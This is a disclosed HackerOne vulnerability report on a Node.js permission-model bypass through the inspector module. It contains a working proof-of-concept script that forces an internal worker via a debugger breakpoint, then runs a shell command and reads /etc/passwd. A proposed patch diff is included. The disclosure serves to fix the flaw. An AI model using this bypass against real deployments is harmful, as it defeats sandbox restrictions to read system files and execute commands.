# Process-based permissions can be bypassed with the "inspector" module.  

## Report Details
- **Report ID**: 1962701
- **URL**: https://hackerone.com/reports/1962701
- **State**: Closed
- **Severity**: high
- **Submitted**: 2023-04-26T17:50:54.899Z
- **Disclosed**: 2023-07-20T20:58:32.838Z

## Reporter
- **Username**: mattaustin
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:**

Restrictions made with with the --experimental-permission flag can by bypassed with the built-in inspector module. 

**Description:** 

The Worker class  can take an argument (the kIsInternal Symbol) to create an "internal worker" which does not respect the process level restrictions. 

We cant access this Symbol('kIsInternal'); directly, however the [inspector module](https://nodejs.org/api/inspector.html) is not disabled when process level restrictions are in place.  "The node:inspector module provides an API for interacting with the V8 inspector."

If we attach inspector inside the Worker constructor before `new WorkerImpl` is created we can simply change the value of "isInternal". 

## Steps To Reproduce:

1. Create the following `bypass.js` file: 

```javascript
const { Session } = require('node:inspector/promises');

const session = new Session();
session.connect();

(async ()=>{
	await session.post('Debugger.enable');
	await session.post('Runtime.enable');

	global.Worker = require('node:worker_threads').Worker;
	
	let {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });
	let { internalProperties } = await session.post("Runtime.getProperties", { objectId: objectId });
	let {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];
	let { scriptSource } = await session.post("Debugger.getScriptSource", { scriptId });

	// find the line number where WorkerImpl is called. 
	const lineNumber = scriptSource.substring(0, scriptSource.indexOf("new WorkerImpl")).split('\n').length;

	// WorkerImpl will bypass permission for internal modules. We can inject the local var "isInternal = true" with a conditional breakpoint.
	await session.post("Debugger.setBreakpointByUrl", {
		lineNumber: lineNumber,
		url: "node:internal/worker",
		columnNumber: 0,
		condition: "((isInternal = true),false)"
	});

	new Worker(`
		const child_process = require("node:child_process");
		console.log(child_process.execSync("ls -l").toString());
		
		console.log(require("fs").readFileSync("/etc/passwd").toString())
	`, {
		eval: true,
		execArgv: [
			"--experimental-permission",
			"--allow-fs-read=*",
			"--allow-fs-write=*",
			"--allow-child-process",
			"--no-warnings"
		]
	});

})()
```

2. Run the following command :

``` bash
node --experimental-permission --allow-fs-read=$(pwd) bypass.js
```
---
If the policies were not bypassed we would expect to see something like: 

```
node --experimental-permission --allow-fs-read=$(pwd) safe.js
node:internal/child_process:1103
  const result = spawn_sync.spawn(options);
                            ^

Error: Access to this API has been restricted
``` 

## Supporting Material/References:
In my opinion inspector should be allowed when process level permissions are being enforced. 
I noticed there was already a flag: EnvironmentFlags::kNoCreateInspector. I took a shot at patching this  out unless ==inspect or --inspect-brk were used, but I didn't know if a more direct options like "--allow-inspector" would be preferred. 

  ``` diff
diff --git a/src/env.cc b/src/env.cc
index 571a8ed5ce..b5b7557bd1 100644
--- a/src/env.cc
+++ b/src/env.cc
@@ -791,6 +791,11 @@ Environment::Environment(IsolateData* isolate_data,
     // spawn/worker nor use addons unless explicitly allowed by the user
     if (!options_->allow_fs_read.empty() || !options_->allow_fs_write.empty()) {
       options_->allow_native_addons = false;
+      DebugOptions debug_options;
+      debug_options = options_->debug_options();
+      if (!debug_options.inspector_enabled || !debug_options.break_first_line) {
+        flags_ = flags_ | EnvironmentFlags::kNoCreateInspector;
+      }
       if (!options_->allow_child_process) {
         permission()->Apply("*", permission::PermissionScope::kChildProcess);
       }
```

## Impact

Permission Model is a mechanism for restricting access to specific resources during execution. This bypasses those restrictions.

## Attachments
No attachments
